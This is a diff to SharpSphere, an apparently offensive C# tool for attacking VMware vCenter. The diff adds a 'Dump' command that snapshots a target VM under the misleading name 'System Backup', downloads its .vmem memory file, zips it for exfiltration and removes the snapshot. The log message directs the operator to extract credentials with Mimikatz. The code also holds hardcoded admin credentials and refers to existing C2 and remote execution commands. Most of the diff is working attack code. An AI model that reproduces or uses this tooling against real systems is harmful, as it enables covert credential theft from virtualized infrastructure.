@@ -2,12 +2,17 @@
 using System.Collections.Generic;
 using System.IO;
 using System.Net.Cache;
+using System.Threading;
 using CommandLine;
 
 namespace SharpSphere
 {
     using System.Linq;
     using vSphere;
+    using NSspi;
+    using NSspi.Contexts;
+    using NSspi.Credentials;
+    using System.IO.Compression;
 
     internal class Program
     {
@@ -16,6 +21,8 @@ namespace SharpSphere
         private static ManagedObjectReference vm;
         private static ServiceContent serviceContent;
         private static NamePasswordAuthentication creds;
+        private static System.ServiceModel.BasicHttpsBinding binding;
+        private static UserSession userSession = null;
         static void Log(string a)
         {
             Console.WriteLine(a);
@@ -37,7 +44,7 @@ namespace SharpSphere
 
                 //Create the vCenter API object
                 Log("[x] Creating vSphere API interface, takes a few minutes...");
-                var binding = new System.ServiceModel.BasicHttpsBinding
+                binding = new System.ServiceModel.BasicHttpsBinding
                 {
                     AllowCookies = true
 
@@ -50,39 +57,120 @@ namespace SharpSphere
                     type = "ServiceInstance",
                     Value = "ServiceInstance",
                 };
-
+                
                 //Bind to vCenter
                 serviceContent = vim.RetrieveServiceContent(moref);
                 Log("[x] Connected to " + serviceContent.about.fullName);
+                
+                //Attempt login
+                if (username != null)
+                {
+                    //Login with username and password
+                    userSession = vim.Login(serviceContent.sessionManager, username, password, null);
+                }
+                /*else
+                {
+                    //Login with SSPI
+                    byte[] rawToken = GetSSPIToken(PackageNames.Kerberos);
+                    string token = Convert.ToBase64String(rawToken);
+                    var token2 = System.Text.Encoding.Default.GetString(rawToken);
+                    try
+                    {
+                        vim.LoginBySSPI(serviceContent.sessionManager, token, null);
+                    }
+                    catch (Exception exception)
+                    {
+                        Console.Out.WriteLine(exception.ToString());
+                    }
 
-                //Authenticate to vCenter API
-
-                UserSession userSession = vim.Login(serviceContent.sessionManager, username, password, null);
+                }*/
                 if (userSession is null)
                     Error(new Exception("Failed to authenticate."));
                 Log("[x] Successfully authenticated");
 
                 //Retrieve filemanager
-                guestFileManager = GetProperty<ManagedObjectReference>(serviceContent.guestOperationsManager, "fileManager"); 
+                guestFileManager = GetProperty<ManagedObjectReference>(serviceContent.guestOperationsManager, "fileManager");
                 if (guestFileManager is null)
                     Error(new Exception("Failed to retrieve filemanager"));
 
                 //Get the current session and check it's valid
-                UserSession currentSession = GetProperty<UserSession>(serviceContent.sessionManager, "currentSession"); 
+                UserSession currentSession = GetProperty<UserSession>(serviceContent.sessionManager, "currentSession");
                 if (currentSession is null || currentSession.key != userSession.key)
                     Error(new Exception("Failed to retrieve current session"));
 
                 //Retrieve target VM
                 if (ip != null)
                     vm = vim.FindByIp(serviceContent.searchIndex, null, ip, true);
-                
+
             }
             catch (Exception fault) //Generic catch all
             {
                 Error(fault);
             }
         }
-        static void ExecuteCommand(NamePasswordAuthentication creds, string arguments, string programPath, string workingDirectory, bool output)
+
+        //WIP for SSO auth
+        /*private static byte[] GetSSPIToken(string packageName)
+        {
+            ClientCurrentCredential clientCred = null;
+            ClientContext client = null;
+
+            ServerCurrentCredential serverCred = null;
+            ServerContext server = null;
+
+            byte[] clientToken;
+            byte[] serverToken;
+
+            SecurityStatus clientStatus;
+
+            try
+            {
+                clientCred = new ClientCurrentCredential(packageName);
+                serverCred = new ServerCurrentCredential(packageName);
+
+                Console.Out.WriteLine(clientCred.PrincipleName);
+
+                client = new ClientContext(
+                    clientCred,
+                    serverCred.PrincipleName, ContextAttrib.Zero
+                );
+
+                server = new ServerContext(
+                    serverCred, ContextAttrib.Zero
+                );
+
+                clientToken = null;
+                serverToken = null;
+
+                clientStatus = client.Init(serverToken, out clientToken);
+
+
+            }
+            finally
+            {
+                if (server != null)
+                {
+                    server.Dispose();
+                }
+
+                if (client != null)
+                {
+                    client.Dispose();
+                }
+
+                if (clientCred != null)
+                {
+                    clientCred.Dispose();
+                }
+
+                if (serverCred != null)
+                {
+                    serverCred.Dispose();
+                }
+            }
+            return clientToken;
+        }*/
+        static void ExecuteCommand(GuestAuthentication creds, string arguments, string programPath, string workingDirectory, bool output)
         {
             try
             {
@@ -158,12 +246,34 @@ namespace SharpSphere
             }
         }
 
+        static GuestAuthentication GuestAuth()
+        {
+            GuestAuthentication guestAuth = new GuestAuthentication()
+            {
+                interactiveSession = false,
+            };
+            ManagedObjectReference guestAuthManager = GetProperty<ManagedObjectReference>(serviceContent.guestOperationsManager, "authManager");
+            try
+            {
+                vim.AcquireCredentialsInGuest(guestAuthManager, vm, guestAuth, 0);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+
+
+            return null;
+        }
+
         static int Execute(ExecuteOptions options)
         {
             try
             {
                 //Connect to target VM
                 Connect(options.url, options.username, options.password, options.ip);
+
+                GuestAuth();
                 //Build credential object to authenticate to guest OS
                 creds = new NamePasswordAuthentication()
                 {
@@ -184,7 +294,7 @@ namespace SharpSphere
         {
             try
             {
-                //Connect to target 
+                //Connect to target
                 Connect(options.url, options.username, options.password, null);
 
                 //Connect to target VM
@@ -198,11 +308,10 @@ namespace SharpSphere
                     foreach (var vm in datacenterVms)
                     {
                         GuestInfo guest = GetProperty<GuestInfo>(vm, "guest");
-                        var networks = GetProperty<ManagedObjectReference[]>(vm, "network");
-                        if (guest.guestOperationsReady)
-                        {
-                            Console.WriteLine("Hostname: " + guest.hostName + " | OS: " + guest.guestFullName + " | Tools: " + guest.toolsVersionStatus2 + " | IP: " + guest.ipAddress);
-                        }
+                        VirtualMachineConfigInfo config = GetProperty<VirtualMachineConfigInfo>(vm, "config");
+                        VirtualMachineRuntimeInfo runtime = GetProperty<VirtualMachineRuntimeInfo>(vm, "runtime");
+                        Console.WriteLine("Name: " + config.name + " | Power: " + runtime.powerState.ToString() + " | OS: " + config.guestFullName + " | Tools: " + guest.toolsVersionStatus2 + " | IP: " + guest.ipAddress);
+
                     }
                 }
             }
@@ -212,6 +321,210 @@ namespace SharpSphere
             }
             return 0;
         }
+
+        static ManagedObjectReference GetTargetVM(string name)
+        {
+            var childEntities = GetProperty<ManagedObjectReference[]>(serviceContent.rootFolder, "childEntity");
+            var datacenters = childEntities.Where(e => e.type == "Datacenter");
+            foreach (var datacenter in datacenters)
+            {
+                var vmFolder = GetProperty<ManagedObjectReference>(datacenter, "vmFolder");
+                var datacenterVms = ScanForVms(vmFolder);
+
+                foreach (var vm in datacenterVms)
+                {
+                    VirtualMachineConfigInfo config = GetProperty<VirtualMachineConfigInfo>(vm, "config");
+                    if (config.name == name)
+                    {
+                        return vm;
+                    }
+                }
+            }
+            return null;
+        }
+
+        static ManagedObjectReference GetSnapshot(string targetvm, bool takeNew)
+        {
+            if (takeNew)
+            {
+                VirtualMachineRuntimeInfo runtime = GetProperty<VirtualMachineRuntimeInfo>(vm, "runtime");
+                if (runtime.powerState.ToString() != "poweredOn")
+                {
+                    Error(new Exception("VM is not powered on, no point snapshotting"));
+                }
+                Log("[x] Creating snapshot for VM " + targetvm + "...");
+                ManagedObjectReference task = vim.CreateSnapshot_Task(vm, "System Backup " + DateTime.Now.ToString(), "System Backup" + DateTime.Now.ToString(), true, true);
+                string state = GetProperty<TaskInfo>(task, "info").state.ToString();
+                while (state != "success")
+                {
+                    switch (state)
+                    {
+                        case "error":
+                            Error(new Exception("Error creating snapshot"));
+                            break;
+                        case "running":
+                            Thread.Sleep(10000);
+                            break;
+
+                    }
+                    state = GetProperty<TaskInfo>(task, "info").state.ToString();
+                }
+                Log("[x] Snapshot created successfully");
+                return (ManagedObjectReference)GetProperty<TaskInfo>(task, "info").result;
+
+            }
+            else
+            {
+                Log("[x] Finding existing snapshots for " + targetvm + "...");
+                VirtualMachineSnapshotInfo snapshotInfo = null;
+                try
+                {
+                    snapshotInfo = GetProperty<VirtualMachineSnapshotInfo>(vm, "snapshot");
+
+                }
+                catch (Exception e)
+                {
+                    Error(new Exception("No existing snapshots found for the VM " + targetvm + ", recommend you try again with --snapshot set"));
+                }
+                return snapshotInfo.currentSnapshot;
+            }
+        }
+
+        static HostDatastoreBrowserSearchSpec GetHostDatastoreBrowserSearchSpec()
+        {
+            string[] extensions = { "*.vmem" };
+            return new HostDatastoreBrowserSearchSpec()
+            {
+                matchPattern = extensions,
+                searchCaseInsensitive = true,
+                searchCaseInsensitiveSpecified = true,
+                details = new FileQueryFlags()
+                {
+                    fileOwner = true,
+                    fileSize = true,
+                    fileType = true,
+                    fileOwnerSpecified = true,
+                    modification = true,
+                },
+            };
+        }
+
+        static int Dump(DumpOptions options)
+        {
+            try
+            {
+                //Connect to target
+                Connect(options.url, options.username, options.password, null);
+
+                //Find target VM
+                vm = GetTargetVM(options.targetvm);
+                if (vm is null) Error(new Exception("Failed to find target VM " + options.targetvm + ", are you sure the name is right?"));
+
+                //Create Snapshot if specified, otherwise find existing one
+                ManagedObjectReference snapshot = GetSnapshot(options.targetvm, options.snapshot);
+
+                //Get information about the snapshot
+                VirtualMachineFileInfo fileInfo = GetProperty<VirtualMachineConfigInfo>(snapshot, "config").files; 
+
+                //Build the objects we need
+                ManagedObjectReference environmentBrowser = GetProperty<ManagedObjectReference>(vm, "environmentBrowser");
+                ManagedObjectReference datastoreBrowser = GetProperty<ManagedObjectReference>(environmentBrowser, "datastoreBrowser");
+
+                //Search for a vmem file
+                ManagedObjectReference task = vim.SearchDatastore_Task(datastoreBrowser, fileInfo.snapshotDirectory, GetHostDatastoreBrowserSearchSpec()); 
+                TaskInfo info = GetProperty<TaskInfo>(task, "info");
+                string state = info.state.ToString();
+                while (state != "success")
+                {
+                    switch (state)
+                    {
+                        case "error":
+                            Error(new Exception("Error searching datastore for snapshot files"));
+                            break;
+                        case "running":
+                            Thread.Sleep(1000);
+                            break;
+
+                    }
+                    state = GetProperty<TaskInfo>(task, "info").state.ToString();
+                }
+                HostDatastoreBrowserSearchResults results = (HostDatastoreBrowserSearchResults)GetProperty<TaskInfo>(task, "info").result;
+
+
+                //Check at least one vmem exists, which it may not if not using --snapshot
+                FileInfo latestFile = null;
+                if (results.file.Length == 0)
+                {
+                    Error(new Exception("Failed to find any .vmem files associated with the VM, despite there being snapshots. Virtual machine memory may not have been captured. Recommend rerunning with --snapshot"));
+                }
+
+                //Grab the latest .vmem file if there is more than one associated with a VM                
+                foreach (FileInfo file in results.file)
+                {
+                    if ( latestFile == null || DateTime.Compare(file.modification, latestFile.modification) > 0)
+                    {
+                        latestFile = file;
+                    }
+                }
+
+                //Build the URLs to download directly from datastore
+                string host = options.url.Remove(options.url.Length - 4);
+                string dsName = FindTextBetween(results.folderPath, "[", "]");
+                string folderPath = results.folderPath.Remove(0, dsName.Length + 3);
+                string vmemURL = host + "/folder/" + folderPath + latestFile.path + "?dcPath=Datacenter&dsName=" + dsName;
+                string vmsnURL = host + "/folder/" + folderPath + latestFile.path.Replace(".vmem", ".vmsn") + "?dcPath=Datacenter&dsName=" + dsName;
+                string vmemFile = options.destination.Replace("\"", string.Empty) + @"\" + Path.GetRandomFileName();
+                string vmsnFile = options.destination.Replace("\"", string.Empty) + @"\" + Path.GetRandomFileName();
+                string zipFile = options.destination.Replace("\"", string.Empty) + @"\" + Path.GetRandomFileName();
+
+                //Make the web requests
+                using (var client = new System.Net.WebClient())
+                {
+                    client.Credentials = new System.Net.NetworkCredential("administrator@vsphere.local", "Password1!");
+                    client.Headers.Set(System.Net.HttpRequestHeader.ContentType, "application/octet-stream");
+                    client.CachePolicy = new HttpRequestCachePolicy(HttpRequestCacheLevel.NoCacheNoStore);
+                    Log("[x] Downloading " + latestFile.path + " (" + latestFile.fileSize / 1048576 + @"MB) to " + vmemFile + "...");
+                    client.DownloadFile(vmemURL, vmemFile);
+
+                    Log("[x] Downloading " + latestFile.path.Replace(".vmem", ".vmsn") + " to " + vmsnFile + "...");
+                    client.DownloadFile(vmsnURL, vmsnFile);
+                }
+
+                //Zip up the two downloaded files
+                Log("[x] Download complete, zipping up so it's easier to exfiltrate...");
+                var zip = ZipFile.Open(zipFile, ZipArchiveMode.Create);
+                zip.CreateEntryFromFile(vmemFile, Path.GetFileName(vmemFile), CompressionLevel.Optimal);
+                zip.CreateEntryFromFile(vmsnFile, Path.GetFileName(vmsnFile), CompressionLevel.Optimal);
+                zip.Dispose();
+                File.Delete(vmemFile);
+                File.Delete(vmsnFile);
+                System.IO.FileInfo zipFileInfo = new System.IO.FileInfo(zipFile);
+                Log("[x] Zipping complete, download " + zipFile + " ("+ zipFileInfo.Length / 1048576 + "MB), rename to .zip, and follow instructions to use with Mimikatz");
+
+                //Delete the snapshot we created if needed
+                if(options.snapshot)
+                {
+                    Log("[x] Deleting the snapshot we created");
+                    vim.RemoveSnapshot_Task(snapshot, false, true);
+                }
+                
+            }
+            catch (Exception fault)
+            {
+                Error(fault);
+            }
+            return 0;
+        }
+
+        //Helper function for stripping datastore name
+        static string FindTextBetween(string text, string left, string right)
+        {
+            int beginIndex = text.IndexOf(left); // find occurence of left delimiter
+            beginIndex += left.Length;
+            int endIndex = text.IndexOf(right, beginIndex); // find occurence of right delimiter
+            return text.Substring(beginIndex, endIndex - beginIndex).Trim();
+        }
+
 
         static void ScanForVmsRecurse(ManagedObjectReference obj, int depth, List<ManagedObjectReference> vms)
         {
@@ -452,7 +765,8 @@ namespace SharpSphere
 
         public static void Main(string[] args)
         {
-            Parser.Default.ParseArguments<ListOptions, ExecuteOptions, C2Options, UploadOptions, DownloadOptions>(args).MapResult(
+            Parser.Default.ParseArguments<DumpOptions, ListOptions, ExecuteOptions, C2Options, UploadOptions, DownloadOptions>(args).MapResult(
+                (DumpOptions options) => Dump(options),
                 (ListOptions options) => List(options),
                 (ExecuteOptions options) => Execute(options),
                 (C2Options options) => StartC2(options),
